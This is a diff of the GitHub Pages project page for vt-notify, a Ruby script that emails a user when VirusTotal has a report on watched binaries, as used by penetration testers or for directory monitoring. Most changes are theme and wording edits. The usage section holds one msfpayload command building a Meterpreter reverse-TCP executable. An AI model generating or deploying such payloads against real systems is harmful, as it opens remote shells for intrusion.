@@ -1,44 +1,51 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
-
   <head>
-    <meta charset='utf-8'>
+    <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="chrome=1">
-    <meta name="description" content="Vt-notify : Get email notification when Virus Total has a copy of your binary.">
+    <title>VirusTotal Notify by AshtinBlanchard</title>
+    <link rel="stylesheet" href="stylesheets/styles.css">
+    <link rel="stylesheet" href="stylesheets/github-dark.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
+    <script src="javascripts/respond.js"></script>
+    <!--[if lt IE 9]>
+      <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+    <!--[if lt IE 8]>
+    <link rel="stylesheet" href="stylesheets/ie.css">
+    <![endif]-->
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
 
-    <link rel="stylesheet" type="text/css" media="screen" href="stylesheets/stylesheet.css">
-
-    <title>Vt-notify</title>
   </head>
-
   <body>
+      <div id="header">
+        <nav>
+          <li class="fork"><a href="https://github.com/AshtinBlanchard/vt-notify">View On GitHub</a></li>
+          <li class="downloads"><a href="https://github.com/AshtinBlanchard/vt-notify/zipball/master">ZIP</a></li>
+          <li class="downloads"><a href="https://github.com/AshtinBlanchard/vt-notify/tarball/master">TAR</a></li>
+          <li class="title">DOWNLOADS</li>
+        </nav>
+      </div><!-- end header -->
 
-    <!-- HEADER -->
-    <div id="header_wrap" class="outer">
-        <header class="inner">
-          <a id="forkme_banner" href="https://github.com/AshtinBlanchard/vt-notify">View on GitHub</a>
+    <div class="wrapper">
 
-          <h1 id="project_title">Vt-notify</h1>
-          <h2 id="project_tagline">Get email notification when Virus Total has a copy of your binary.</h2>
+      <section>
+        <div id="title">
+          <h1>VirusTotal Notify</h1>
+          <p>Get email notification when Virus Total has a copy of your binary.</p>
+          <hr>
+          <span class="credits left">Project maintained by <a href="https://github.com/AshtinBlanchard">AshtinBlanchard</a></span>
+          <span class="credits right">Hosted on GitHub Pages &mdash; Theme by <a href="https://twitter.com/michigangraham">mattgraham</a></span>
+        </div>
 
-            <section id="downloads">
-              <a class="zip_download_link" href="https://github.com/AshtinBlanchard/vt-notify/zipball/master">Download this project as a .zip file</a>
-              <a class="tar_download_link" href="https://github.com/AshtinBlanchard/vt-notify/tarball/master">Download this project as a tar.gz file</a>
-            </section>
-        </header>
-    </div>
-
-    <!-- MAIN CONTENT -->
-    <div id="main_content_wrap" class="outer">
-      <section id="main_content" class="inner">
         <h1>
 <a id="virus-total-notifier" class="anchor" href="#virus-total-notifier" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Virus Total Notifier</h1>
 
-<p>This project was originally created to set up a notification so when Virus Total had a report for a specific binary (One used in a pen test or otherwise) the pentester could be notified via log or email. It runs in an infinite loop and does not check files or hashes that have already been detected, however it does continue to re-check hashes that haven't been.</p>
+<p>This project was originally created to notify the user when Virus Total had a report for a specific binary (i.e. one used in a penetration test or otherwise) the penetration tester could be notified via log or email. It runs in an infinite loop and does not check files or hashes that have already been detected by the program; It does, however, continue to re-check hashes that haven't been detected.</p>
 
-<p>However, this can also be used as a detection mechanism. Target it at your web-root or other sensitive directory and become notified when anything that has a report on Virus Total is added to your directory.</p>
+<p>This program can also be used as a detection mechanism. Target it towards your web-root or other sensitive directory and it will notify you when anything that has a report on Virus Total is added to your directory.</p>
 
-<p>The script doesn't have anything Linux specific in it, so it should be portable anywhere Ruby is installed.</p>
+<p>The script doesn't have anything OS specific in it, so it should be portable anywhere Ruby is installed.</p>
 
 <h1>
 <a id="usage" class="anchor" href="#usage" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Usage</h1>
@@ -53,7 +60,7 @@
     -a APIKEYFILENAME // file contianing API key hash on first line, defaults to apikey.txt
     -l LOGFILENAME // file to write/read positive entries to/from, defaults to results.log
     -i INTERVAL // how often VT is checked, defaults to every 10 minutes
-    -h
+    -h // this help screen
 </code></pre>
 
 <p>For example, the following takes all 500+ files in the hackarmoury repository, SHA1 hashes them and checks them against Virus Total. The ones that have been submitted (even those that have a 0 detection rate) are reported via email to <a href="mailto:justanotheruser@gmail.com">justanotheruser@gmail.com</a> via the Gmail email servers. </p>
@@ -66,7 +73,7 @@
 <pre><code>./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.92.100 X &gt; evil.exe
 </code></pre>
 
-<p>And setting up vt-notify to just check on it, with the notifications going to the same gmail account, checking ever 20 seconds:</p>
+<p>And setting up vt-notify to just check on it, with the notifications going to the same gmail account, checking every 20 seconds:</p>
 
 <pre><code>./vt-notify.rb -s evil.exe -e justanotheruser@gmail.com -m gmail-smtp-in.l.google.com -i 20
 </code></pre>
@@ -92,17 +99,9 @@ Found:       1
 
 <p>Hash lists are also supported in hash-per-line files (-f) and single SHA1 (-S), however I don't have the ability to support multiple singles on the command line (-S) or (-s)</p>
       </section>
-    </div>
 
-    <!-- FOOTER  -->
-    <div id="footer_wrap" class="outer">
-      <footer class="inner">
-        <p class="copyright">Vt-notify maintained by <a href="https://github.com/AshtinBlanchard">AshtinBlanchard</a></p>
-        <p>Published with <a href="https://pages.github.com">GitHub Pages</a></p>
-      </footer>
     </div>
-
+    <!--[if !IE]><script>fixScale(document);</script><![endif]-->
     
-
   </body>
 </html>
